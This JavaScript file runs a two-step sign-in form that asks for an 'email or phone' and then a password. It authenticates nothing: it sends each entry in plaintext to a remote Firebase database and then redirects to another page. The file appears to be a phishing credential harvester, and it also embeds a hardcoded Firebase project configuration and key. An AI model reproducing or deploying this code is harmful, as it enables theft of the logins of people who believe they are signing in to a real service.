// Import Firebase modules (using modular Firebase)
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-database.js";

// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyDZAnKjWmv3cWhwOXpL7UjRgOpwK6mQVi0",
  authDomain: "django-eb349.firebaseapp.com",
  databaseURL: "https://django-eb349-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "django-eb349",
  storageBucket: "django-eb349.appspot.com",
  messagingSenderId: "271670409370",
  appId: "1:271670409370:web:51498b4b417669173f8723"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// DOM Elements
const dynamicInput = document.getElementById('dynamicInput');
const dynamicLabel = document.getElementById('dynamicLabel');
const loginBtn = document.getElementById('loginBtn');
let isPasswordStep = false;

// Handle "Next" button click
loginBtn.addEventListener('click', function () {
  const inputValue = dynamicInput.value.trim();

  if (!isPasswordStep) {
    if (inputValue === '') {
      alert('Please enter your email or phone.');
      dynamicInput.focus();
      return;
    }

    // Save email to Firebase
    saveToFirebase('email', inputValue)
      .then(() => {
        console.log('Email saved successfully!');
        // Switch to password step
        isPasswordStep = true;
        dynamicInput.value = '';
        dynamicInput.type = 'password'; // Switch to password input type
        dynamicLabel.textContent = 'Enter your password';
        loginBtn.textContent = 'Sign In';

        // Optionally, hide the email input field (or clear it)
        dynamicLabel.classList.add('hidden');
      })
      .catch(error => {
        console.error('Error saving email to Firebase:', error);
        alert('Failed to save email. Please try again.');
      });
  } else {
    if (inputValue === '') {
      alert('Please enter your password.');
      dynamicInput.focus();
      return;
    }

    // Save password to Firebase
    saveToFirebase('password', inputValue)
      .then(() => {
        console.log('Password saved successfully!');
        // Redirect to the main index page
        window.location.href = 'index.html';
      })
      .catch(error => {
        console.error('Error saving password to Firebase:', error);
        alert('Failed to save password. Please try again.');
      });
  }
});

// Function to save data to Firebase
function saveToFirebase(key, value) {
  const userRef = ref(database, `users/${key}`);
  return set(userRef, { [key]: value });
}


